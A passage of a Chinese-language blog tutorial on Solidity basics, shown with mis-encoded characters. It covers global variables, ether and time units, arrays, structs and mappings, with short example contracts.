class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢ä¾‹å­é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨äº†3ä¸ªå¸¸ç”¨çš„å…¨å±€å˜é‡ï¼š<code>msg.sender</code>ï¼Œ<code>block.number</code>å’Œ<code>msg.data</code>ï¼Œä»–ä»¬åˆ†åˆ«ä»£è¡¨è¯·æ±‚å‘èµ·åœ°å€ï¼Œå½“å‰åŒºå—é«˜åº¦ï¼Œå’Œè¯·æ±‚æ•°æ®ã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„å…¨å±€å˜é‡ï¼Œæ›´å®Œæ•´çš„åˆ—è¡¨è¯·çœ‹è¿™ä¸ª<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">é“¾æ¥</a>ï¼š</p><ul><li><code>blockhash(uint blockNumber)</code>: (<code>bytes32</code>) ç»™å®šåŒºå—çš„å“ˆå¸Œå€¼ â€“ åªé€‚ç”¨äº256æœ€è¿‘åŒºå—, ä¸åŒ…å«å½“å‰åŒºå—ã€‚</li><li><code>block.coinbase</code>: (<code>address payable</code>) å½“å‰åŒºå—çŸ¿å·¥çš„åœ°å€</li><li><code>block.gaslimit</code>: (<code>uint</code>) å½“å‰åŒºå—çš„gaslimit</li><li><code>block.number</code>: (<code>uint</code>) å½“å‰åŒºå—çš„number</li><li><code>block.timestamp</code>: (<code>uint</code>) å½“å‰åŒºå—çš„æ—¶é—´æˆ³ï¼Œä¸ºunixçºªå…ƒä»¥æ¥çš„ç§’</li><li><code>gasleft()</code>: (<code>uint256</code>) å‰©ä½™ gas</li><li><code>msg.data</code>: (<code>bytes calldata</code>) å®Œæ•´call data</li><li><code>msg.sender</code>: (<code>address payable</code>) æ¶ˆæ¯å‘é€è€… (å½“å‰ caller)</li><li><code>msg.sig</code>: (<code>bytes4</code>) calldataçš„å‰å››ä¸ªå­—èŠ‚ (function identifier)</li><li><code>msg.value</code>: (<code>uint</code>) å½“å‰äº¤æ˜“å‘é€çš„ <code>wei</code> å€¼</li><li><code>block.blobbasefee</code>: (<code>uint</code>) å½“å‰åŒºå—çš„blobåŸºç¡€è´¹ç”¨ã€‚è¿™æ˜¯Cancunå‡çº§æ–°å¢çš„å…¨å±€å˜é‡ã€‚</li><li><code>blobhash(uint index)</code>: (<code>bytes32</code>) è¿”å›è·Ÿå½“å‰äº¤æ˜“å…³è”çš„ç¬¬ <code>index</code> ä¸ªblobçš„ç‰ˆæœ¬åŒ–å“ˆå¸Œï¼ˆç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºç‰ˆæœ¬å·ï¼Œå½“å‰ä¸º<code>0x01</code>ï¼Œåé¢æ¥KZGæ‰¿è¯ºçš„SHA256å“ˆå¸Œçš„æœ€å31ä¸ªå­—èŠ‚ï¼‰ã€‚è‹¥å½“å‰äº¤æ˜“ä¸åŒ…å«blobï¼Œåˆ™è¿”å›ç©ºå­—èŠ‚ã€‚è¿™æ˜¯Cancunå‡çº§æ–°å¢çš„å…¨å±€å˜é‡ã€‚</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124230136670.png" alt="image-20250124230136670"></p><h4 id="å…¨å±€å˜é‡-ä»¥å¤ªå•ä½ä¸æ—¶é—´å•ä½">å…¨å±€å˜é‡-ä»¥å¤ªå•ä½ä¸æ—¶é—´å•ä½</h4><p><strong>ä»¥å¤ªå•ä½</strong></p><p><code>Solidity</code>ä¸­ä¸å­˜åœ¨å°æ•°ç‚¹ï¼Œä»¥<code>0</code>ä»£æ›¿ä¸ºå°æ•°ç‚¹ï¼Œæ¥ç¡®ä¿äº¤æ˜“çš„ç²¾ç¡®åº¦ï¼Œå¹¶ä¸”é˜²æ­¢ç²¾åº¦çš„æŸå¤±ï¼Œåˆ©ç”¨ä»¥å¤ªå•ä½å¯ä»¥é¿å…è¯¯ç®—çš„é—®é¢˜ï¼Œæ–¹ä¾¿ç¨‹åºå‘˜åœ¨åˆçº¦ä¸­å¤„ç†è´§å¸äº¤æ˜“ã€‚</p><ul><li><code>wei</code>: 1</li><li><code>gwei</code>: 1e9 = 1000000000</li><li><code>ether</code>: 1e18 = 1000000000000000000</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124232933314.png" alt="image-20250124232933314"></p><p><strong>æ—¶é—´å•ä½</strong></p><p>å¯ä»¥åœ¨åˆçº¦ä¸­è§„å®šä¸€ä¸ªæ“ä½œå¿…é¡»åœ¨ä¸€å‘¨å†…å®Œæˆï¼Œæˆ–è€…æŸä¸ªäº‹ä»¶åœ¨ä¸€ä¸ªæœˆåå‘ç”Ÿã€‚è¿™æ ·å°±èƒ½è®©åˆçº¦çš„æ‰§è¡Œå¯ä»¥æ›´åŠ ç²¾ç¡®ï¼Œä¸ä¼šå› ä¸ºæŠ€æœ¯ä¸Šçš„è¯¯å·®è€Œå½±å“åˆçº¦çš„ç»“æœã€‚å› æ­¤ï¼Œæ—¶é—´å•ä½åœ¨<code>Solidity</code>ä¸­æ˜¯ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œæœ‰åŠ©äºæé«˜åˆçº¦çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p><ul><li><code>seconds</code>: 1</li><li><code>minutes</code>: 60 seconds = 60</li><li><code>hours</code>: 60 minutes = 3600</li><li><code>days</code>: 24 hours = 86400</li><li><code>weeks</code>: 7 days = 604800</li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124233108775.png" alt="image-20250124233108775"></p><h2 id="å¼•ç”¨ç±»å‹å’Œæ˜ å°„ç±»å‹">å¼•ç”¨ç±»å‹å’Œæ˜ å°„ç±»å‹</h2><h3 id="å¼•ç”¨ç±»å‹">å¼•ç”¨ç±»å‹</h3><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬å°†ä»‹ç»<code>Solidity</code>ä¸­çš„ä¸¤ä¸ªé‡è¦å˜é‡ç±»å‹ï¼šæ•°ç»„ï¼ˆ<code>array</code>ï¼‰å’Œç»“æ„ä½“ï¼ˆ<code>struct</code>ï¼‰ã€‚</p><h4 id="æ•°ç»„array">æ•°ç»„array</h4><p>æ•°ç»„ï¼ˆ<code>Array</code>ï¼‰æ˜¯<code>Solidity</code>å¸¸ç”¨çš„ä¸€ç§å˜é‡ç±»å‹ï¼Œç”¨æ¥å­˜å‚¨ä¸€ç»„æ•°æ®ï¼ˆæ•´æ•°ï¼Œå­—èŠ‚ï¼Œåœ°å€ç­‰ç­‰ï¼‰ã€‚æ•°ç»„åˆ†ä¸ºå›ºå®šé•¿åº¦æ•°ç»„å’Œå¯å˜é•¿åº¦æ•°ç»„ä¸¤ç§ï¼š</p><ul><li>å›ºå®šé•¿åº¦æ•°ç»„ï¼šåœ¨å£°æ˜æ—¶æŒ‡å®šæ•°ç»„çš„é•¿åº¦ã€‚ç”¨<code>T[k]</code>çš„æ ¼å¼å£°æ˜ï¼Œå…¶ä¸­<code>T</code>æ˜¯å…ƒç´ çš„ç±»å‹ï¼Œ<code>k</code>æ˜¯é•¿åº¦ï¼Œä¾‹å¦‚ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// å›ºå®šé•¿åº¦ Array</span><br><span class="line">uint[8] array1;</span><br><span class="line">bytes1[5] array2;</span><br><span class="line">address[100] array3;</span><br></pre></td></tr></table></figure><ul><li>å¯å˜é•¿åº¦æ•°ç»„ï¼ˆåŠ¨æ€æ•°ç»„ï¼‰ï¼šåœ¨å£°æ˜æ—¶ä¸æŒ‡å®šæ•°ç»„çš„é•¿åº¦ã€‚ç”¨<code>T[]</code>çš„æ ¼å¼å£°æ˜ï¼Œå…¶ä¸­<code>T</code>æ˜¯å…ƒç´ çš„ç±»å‹ï¼Œä¾‹å¦‚ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// å¯å˜é•¿åº¦ Array</span><br><span class="line">uint[] array4;</span><br><span class="line">bytes1[] array5;</span><br><span class="line">address[] array6;</span><br><span class="line">bytes array7;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„âš ï¸</strong>ï¼š<code>bytes</code>æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯æ•°ç»„ï¼Œä½†æ˜¯ä¸ç”¨åŠ <code>[]</code>ã€‚å¦å¤–ï¼Œä¸èƒ½ç”¨<code>byte[]</code>å£°æ˜å•å­—èŠ‚æ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨<code>bytes</code>æˆ–<code>bytes1[]</code>ã€‚<code>bytes</code> æ¯” <code>bytes1[]</code> çœgasã€‚</p><h5 id="åˆ›å»ºæ•°ç»„çš„è§„åˆ™">åˆ›å»ºæ•°ç»„çš„è§„åˆ™</h5><p>åœ¨Solidityé‡Œï¼Œåˆ›å»ºæ•°ç»„æœ‰ä¸€äº›è§„åˆ™ï¼š</p><ul><li>å¯¹äº<code>memory</code>ä¿®é¥°çš„<code>åŠ¨æ€æ•°ç»„</code>ï¼Œå¯ä»¥ç”¨<code>new</code>æ“ä½œç¬¦æ¥åˆ›å»ºï¼Œä½†æ˜¯å¿…é¡»å£°æ˜é•¿åº¦ï¼Œå¹¶ä¸”å£°æ˜åé•¿åº¦ä¸èƒ½æ”¹å˜ã€‚ä¾‹å­ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// memoryåŠ¨æ€æ•°ç»„</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure><ul><li><p>æ•°ç»„å­—é¢å¸¸æ•°(Array Literals)æ˜¯å†™ä½œè¡¨è¾¾å¼å½¢å¼çš„æ•°ç»„ï¼Œç”¨æ–¹æ‹¬å·åŒ…ç€æ¥åˆå§‹åŒ–arrayçš„ä¸€ç§æ–¹å¼ï¼Œå¹¶ä¸”é‡Œé¢æ¯ä¸€ä¸ªå…ƒç´ çš„typeæ˜¯ä»¥ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå‡†çš„ï¼Œä¾‹å¦‚<code>[1,2,3]</code>é‡Œé¢æ‰€æœ‰çš„å…ƒç´ éƒ½æ˜¯<code>uint8</code>ç±»å‹ï¼Œå› ä¸ºåœ¨Solidityä¸­ï¼Œå¦‚æœä¸€ä¸ªå€¼æ²¡æœ‰æŒ‡å®štypeçš„è¯ï¼Œä¼šæ ¹æ®ä¸Šä¸‹æ–‡æ¨æ–­å‡ºå…ƒç´ çš„ç±»å‹ï¼Œé»˜è®¤å°±æ˜¯æœ€å°å•ä½çš„typeï¼Œè¿™é‡Œé»˜è®¤æœ€å°å•ä½ç±»å‹æ˜¯<code>uint8</code>ã€‚è€Œ<code>[uint(1),2,3]</code>é‡Œé¢çš„å…ƒç´ éƒ½æ˜¯<code>uint</code>ç±»å‹ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå…ƒç´ æŒ‡å®šäº†æ˜¯<code>uint</code>ç±»å‹äº†ï¼Œé‡Œé¢æ¯ä¸€ä¸ªå…ƒç´ çš„typeéƒ½ä»¥ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå‡†ã€‚</p><p>ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ<strong>å¦‚æœæ²¡æœ‰å¯¹ä¼ å…¥ <code>g()</code> å‡½æ•°çš„æ•°ç»„è¿›è¡Œ <code>uint</code> è½¬æ¢ï¼Œæ˜¯ä¼šæŠ¥é”™çš„ã€‚</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    function f() public pure &#123;</span><br><span class="line">        g([uint(1), 2, 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    function g(uint[3] memory _data) public pure &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœåˆ›å»ºçš„æ˜¯åŠ¨æ€æ•°ç»„ï¼Œä½ éœ€è¦ä¸€ä¸ªä¸€ä¸ªå…ƒç´ çš„èµ‹å€¼ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint[] memory x = new uint[](3);</span><br><span class="line">x[0] = 1;</span><br><span class="line">x[1] = 3;</span><br><span class="line">x[2] = 4;</span><br></pre></td></tr></table></figure><h5 id="æ•°ç»„æˆå‘˜">æ•°ç»„æˆå‘˜</h5><ul><li><code>length</code>: æ•°ç»„æœ‰ä¸€ä¸ªåŒ…å«å…ƒç´ æ•°é‡çš„<code>length</code>æˆå‘˜ï¼Œ<code>memory</code>æ•°ç»„çš„é•¿åº¦åœ¨åˆ›å»ºåæ˜¯å›ºå®šçš„ã€‚</li><li><code>push()</code>: <code>åŠ¨æ€æ•°ç»„</code>æ‹¥æœ‰<code>push()</code>æˆå‘˜ï¼Œå¯ä»¥<strong>åœ¨æ•°ç»„æœ€åæ·»åŠ ä¸€ä¸ª<code>0</code>å…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å¼•ç”¨</strong>ã€‚</li><li><code>push(x)</code>: <code>åŠ¨æ€æ•°ç»„</code>æ‹¥æœ‰<code>push(x)</code>æˆå‘˜ï¼Œ<strong>å¯ä»¥åœ¨æ•°ç»„æœ€åæ·»åŠ ä¸€ä¸ª<code>x</code>å…ƒç´ </strong>ã€‚</li><li><code>pop()</code>: <code>åŠ¨æ€æ•°ç»„</code>æ‹¥æœ‰<code>pop()</code>æˆå‘˜ï¼Œ<strong>å¯ä»¥ç§»é™¤æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ã€‚</strong></li></ul><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124234418473.png" alt="image-20250124234418473"></p><h4 id="ç»“æ„ä½“struct">ç»“æ„ä½“struct</h4><p>æ­¤æ—¶ä»£ç <code>StructTypes.sol</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract StructTypes &#123;</span><br><span class="line">    // ç»“æ„ä½“ Struct</span><br><span class="line">    struct Student&#123;</span><br><span class="line">        uint256 id;</span><br><span class="line">        uint256 score; </span><br><span class="line">    &#125;</span><br><span class="line">    Student student; // åˆå§‹ä¸€ä¸ªstudentç»“æ„ä½“</span><br><span class="line">    //  ç»™ç»“æ„ä½“èµ‹å€¼</span><br><span class="line">    // æ–¹æ³•1:åœ¨å‡½æ•°ä¸­åˆ›å»ºä¸€ä¸ªstorageçš„structå¼•ç”¨</span><br><span class="line">    function initStudent1() external&#123;</span><br><span class="line">        Student storage _student = student; // assign a copy of student</span><br><span class="line">        _student.id = 11;</span><br><span class="line">        _student.score = 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // æ–¹æ³•2:ç›´æ¥å¼•ç”¨çŠ¶æ€å˜é‡çš„struct</span><br><span class="line">    function initStudent2() external&#123;</span><br><span class="line">        student.id = 1;</span><br><span class="line">        student.score = 80;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // æ–¹æ³•3:æ„é€ å‡½æ•°å¼</span><br><span class="line">    function initStudent3() external &#123;</span><br><span class="line">        student = Student(3, 90);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // æ–¹æ³•4:key value</span><br><span class="line">    function initStudent4() external &#123;</span><br><span class="line">        student = Student(&#123;id: 4, score: 60&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Solidity</code>æ”¯æŒé€šè¿‡æ„é€ ç»“æ„ä½“çš„å½¢å¼å®šä¹‰æ–°çš„ç±»å‹ã€‚ç»“æ„ä½“ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯åŸå§‹ç±»å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯å¼•ç”¨ç±»å‹ï¼›ç»“æ„ä½“å¯ä»¥ä½œä¸ºæ•°ç»„æˆ–æ˜ å°„çš„å…ƒç´ ã€‚åˆ›å»ºç»“æ„ä½“çš„æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// ç»“æ„ä½“</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student student; // åˆå§‹ä¸€ä¸ªstudentç»“æ„ä½“</span><br></pre></td></tr></table></figure><p>ç»™ç»“æ„ä½“èµ‹å€¼çš„å››ç§æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//  ç»™ç»“æ„ä½“èµ‹å€¼</span><br><span class="line">// æ–¹æ³•1:åœ¨å‡½æ•°ä¸­åˆ›å»ºä¸€ä¸ªstorageçš„structå¼•ç”¨</span><br><span class="line">function initStudent1() external&#123;</span><br><span class="line">    Student storage _student = student; // assign a copy of student</span><br><span class="line">    _student.id = 11;</span><br><span class="line">    _student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// æ–¹æ³•2:ç›´æ¥å¼•ç”¨çŠ¶æ€å˜é‡çš„struct</span><br><span class="line">function initStudent2() external&#123;</span><br><span class="line">    student.id = 1;</span><br><span class="line">    student.score = 80;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// æ–¹æ³•3:æ„é€ å‡½æ•°å¼</span><br><span class="line">function initStudent3() external &#123;</span><br><span class="line">    student = Student(3, 90);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// æ–¹æ³•4:key value</span><br><span class="line">function initStudent4() external &#123;</span><br><span class="line">    student = Student(&#123;id: 4, score: 60&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ˜ å°„ç±»å‹">æ˜ å°„ç±»å‹</h3><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬å°†ä»‹ç»æ˜ å°„ï¼ˆ<code>Mapping</code>ï¼‰ç±»å‹ï¼ŒSolidityä¸­å­˜å‚¨é”®å€¼å¯¹çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥ç†è§£ä¸ºå“ˆå¸Œè¡¨ã€‚</p><p>æµ‹è¯•ä»£ç <code>Mapping.sol</code>ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Mapping &#123;</span><br><span class="line">    mapping(uint =&gt; address) public idToAddress; // idæ˜ å°„åˆ°åœ°å€</span><br><span class="line">    mapping(address =&gt; address) public swapPair; // å¸å¯¹çš„æ˜ å°„ï¼Œåœ°å€åˆ°åœ°å€</span><br><span class="line">    </span><br><span class="line">    // è§„åˆ™1. _KeyTypeä¸èƒ½æ˜¯è‡ªå®šä¹‰çš„ ä¸‹é¢è¿™ä¸ªä¾‹å­ä¼šæŠ¥é”™</span><br><span class="line">    // æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ Struct</span><br><span class="line">    // struct Student&#123;</span><br><span class="line">    //    uint256 id;</span><br><span class="line">    //    uint256 score; </span><br><span class="line">    //&#125;</span><br><span class="line">    // mapping(Struct =&gt; uint) public testVar;</span><br><span class="line"></span><br><span class="line">    function writeMap (uint _Key, address _Value) public&#123;</span><br><span class="line">        idToAddress[_Key] = _Value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ˜ å°„Mapping">æ˜ å°„Mapping</h4><p>åœ¨æ˜ å°„ä¸­ï¼Œäººä»¬å¯ä»¥é€šè¿‡é”®ï¼ˆ<code>Key</code>ï¼‰æ¥æŸ¥è¯¢å¯¹åº”çš„å€¼ï¼ˆ<code>Value</code>ï¼‰ï¼Œæ¯”å¦‚ï¼šé€šè¿‡ä¸€ä¸ªäººçš„<code>id</code>æ¥æŸ¥è¯¢ä»–çš„é’±åŒ…åœ°å€ã€‚</p><p>å£°æ˜æ˜ å°„çš„æ ¼å¼ä¸º<code>mapping(_KeyType =&gt; _ValueType)</code>ï¼Œå…¶ä¸­<code>_KeyType</code>å’Œ<code>_ValueType</code>åˆ†åˆ«æ˜¯<code>Key</code>å’Œ<code>Value</code>çš„å˜é‡ç±»å‹ã€‚ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // idæ˜ å°„åˆ°åœ°å€</span><br><span class="line">mapping(address =&gt; address) public swapPair; // å¸å¯¹çš„æ˜ å°„ï¼Œåœ°å€åˆ°åœ°å€</span><br></pre></td></tr></table></figure><h4 id="æ˜ å°„çš„è§„åˆ™">æ˜ å°„çš„è§„åˆ™</h4><ul><li><strong>è§„åˆ™1</strong>ï¼š**æ˜ å°„çš„<code>_KeyType</code>åªèƒ½é€‰æ‹©Solidityå†…ç½®çš„å€¼ç±»å‹ï¼Œæ¯”å¦‚<code>uint</code>ï¼Œ<code>address</code>ç­‰ï¼Œä¸èƒ½ç”¨è‡ªå®šä¹‰çš„ç»“æ„ä½“ã€‚è€Œ<code>_ValueType</code>å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»å‹ã€‚**ä¸‹é¢è¿™ä¸ªä¾‹å­ä¼šæŠ¥é”™ï¼Œå› ä¸º<code>_KeyType</code>ä½¿ç”¨äº†æˆ‘ä»¬è‡ªå®šä¹‰çš„ç»“æ„ä½“ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ Struct</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line">mapping(Student =&gt; uint) public testVar;</span><br></pre></td></tr></table></figure><ul><li><p><strong>è§„åˆ™2</strong>ï¼šæ˜ å°„çš„å­˜å‚¨ä½ç½®å¿…é¡»æ˜¯<code>storage</code>ï¼Œå› æ­¤å¯ä»¥ç”¨äºåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œå‡½æ•°ä¸­çš„<code>storage</code>å˜é‡å’Œlibraryå‡½æ•°çš„å‚æ•°ï¼ˆè§<a href="https://github.com/ethereum/solidity/issues/4635">ä¾‹å­</a>ï¼‰ã€‚ä¸èƒ½ç”¨äº<code>public</code>å‡½æ•°çš„å‚æ•°æˆ–è¿”å›ç»“æœä¸­ï¼Œå› ä¸º<code>mapping</code>è®°å½•çš„æ˜¯ä¸€ç§å…³ç³» (key - value pair)ã€‚</p></li><li><p><strong>è§„åˆ™3</strong>ï¼šå¦‚æœæ˜ å°„å£°æ˜ä¸º<code>public</code>ï¼Œé‚£ä¹ˆSolidityä¼šè‡ªåŠ¨ç»™ä½ åˆ›å»ºä¸€ä¸ª<code>getter</code>å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡<code>Key</code>æ¥æŸ¥è¯¢å¯¹åº”çš„<code>Value</code>ã€‚</p></li><li><p><strong>è§„åˆ™4</strong>ï¼šç»™æ˜ å°„æ–°å¢çš„é”®å€¼å¯¹çš„è¯­æ³•ä¸º<code>_Var[_Key] = _Value</code>ï¼Œå…¶ä¸­<code>_Var</code>æ˜¯æ˜ å°„å˜é‡åï¼Œ<code>_Key</code>å’Œ<code>_Value</code>å¯¹åº”æ–°å¢çš„é”®å€¼å¯¹ã€‚ä¾‹å­ï¼š</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function writeMap (uint _Key, address _Value) public&#123;</span><br><span class="line">    idToAddress[_Key] = _Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™å…¥<code>mapping</code>ï¼Œå¹¶è¯»å–ã€‚</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125004147867.png" alt="image-20250125004147867"></p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250125004238778.png" alt="image-20250125004238778"></p><h4 id="æ˜ å°„çš„åŸç†">æ˜ å°„çš„åŸç†</h4><ul><li><strong>åŸç†1</strong>: <strong>æ˜ å°„ä¸å‚¨å­˜ä»»ä½•é”®ï¼ˆ<code>Key</code>ï¼‰çš„èµ„è®¯ï¼Œä¹Ÿæ²¡æœ‰lengthçš„èµ„è®¯ã€‚</strong></li><li><strong>åŸç†2</strong>: æ˜ å°„ä½¿ç”¨<code>keccak256(abi.encodePacked(key, slot))</code>å½“æˆoffsetå­˜å–valueï¼Œå…¶ä¸­<code>slot</code>æ˜¯æ˜ å°„å˜é‡å®šä¹‰æ‰€åœ¨çš„æ’æ§½ä½ç½®ã€‚</li><li><strong>åŸç†3</strong>: å› ä¸ºEthereumä¼šå®šä¹‰æ‰€æœ‰æœªä½¿ç”¨çš„ç©ºé—´ä¸º0ï¼Œæ‰€ä»¥<strong>æœªèµ‹å€¼ï¼ˆ<code>Value</code>ï¼‰çš„é”®ï¼ˆ<code>Key</code>ï¼‰åˆå§‹å€¼éƒ½æ˜¯å„ä¸ªtypeçš„é»˜è®¤å€¼</strong>ï¼Œå¦‚uintçš„é»˜è®¤å€¼æ˜¯0ã€‚</li></ul><h2 id="å˜é‡åˆå§‹åŒ–">å˜é‡åˆå§‹åŒ–</h2><p>åœ¨<code>Solidity</code>ä¸­ï¼Œå£°æ˜ä½†æ²¡èµ‹å€¼çš„å˜é‡éƒ½æœ‰å®ƒçš„åˆå§‹å€¼æˆ–é»˜è®¤å€¼ã€‚è¿™ä¸€è®²ï¼Œæˆ‘ä»¬å°†ä»‹ç»å¸¸ç”¨å˜é‡çš„åˆå§‹å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 